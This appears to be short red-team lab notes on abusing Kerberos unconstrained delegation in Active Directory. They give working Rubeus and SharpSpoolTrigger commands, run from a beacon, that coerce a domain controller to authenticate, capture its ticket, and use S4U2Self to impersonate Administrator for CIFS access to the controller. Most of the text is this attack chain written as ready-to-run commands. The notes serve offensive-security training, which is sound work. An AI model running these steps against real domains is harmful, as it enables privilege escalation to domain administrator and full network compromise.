- Limitation: Unconstrained delegation can capture a user's TGT when they authenticate to the compromised computer, but this relies on user interaction.
- Alternative: Trigger a computer account (e.g., a domain controller) to authenticate directly to a monitored system.
- Remote authentication triggers:
    
    - SpoolSample: Uses the Print System Remote Protocol (`MS-RPRN`).
    - PetitPotam: Uses the Encrypting File System Remote Protocol (`MS-EFSRPC`).

- Goal: Capture the computer's authentication ticket and leverage delegation techniques for further access.

### Monitor
First put it into monito mode
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

Then use a tool such as [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) to force _lon-dc-1_ to authenticate to _lon-ws-1_.
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```
-> Run it once

Then use `krb_dump` to dump, but consider that you cant authenticate it via its token, its beacause computers dont have local admin access to themselves.

So use `S4U2Self` to impersonate another user like administrator
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:doIFt[...snip...]5DT00= /nowrap
```

OR use this:
```
krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```
